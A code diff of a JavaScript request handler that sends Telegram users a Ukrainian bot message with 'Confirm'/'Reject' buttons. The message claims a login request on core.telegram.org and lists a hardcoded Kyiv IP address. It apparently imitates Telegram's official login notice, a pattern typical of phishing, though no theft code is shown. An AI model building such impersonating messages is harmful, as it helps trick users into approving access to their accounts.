@@ -7,7 +7,7 @@ module.exports = async function handler(req, res) {
 
   const { user } = req.body;
 
-  const msg = `${user.first_name}, ми одержали запит на авторизацію на [core.telegram.org](https://core.telegram.org) за допомогою вашого Telegram-акаунта.
+  const message = `${user.first_name}, ми одержали запит на авторизацію на core.telegram.org за допомогою вашого Telegram-акаунта.
 
 Щоб підтвердити вхід, натисніть кнопку «Підтвердити» нижче.
 
@@ -21,23 +21,23 @@ IP-адреса: 85.114.198.218 (Kyiv, Ukraine)
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       chat_id: user.id,
-      text: msg,
+      text: message,
       parse_mode: 'Markdown',
       reply_markup: {
         inline_keyboard: [
           [
             { text: '✅ Підтвердити', callback_data: 'confirm_login' },
-            { text: '❌ Відхилити', callback_data: 'deny_login' },
-          ],
-        ],
-      },
-    }),
+            { text: '❌ Відхилити', callback_data: 'deny_login' }
+          ]
+        ]
+      }
+    })
   });
 
   const data = await result.json();
 
   if (!data.ok) {
-    return res.status(500).json({ success: false, message: 'Не вдалося надіслати повідомлення Telegram', error: data });
+    return res.status(500).json({ success: false, message: 'Помилка при надсиланні повідомлення', error: data });
   }
 
   return res.status(200).json({ success: true });
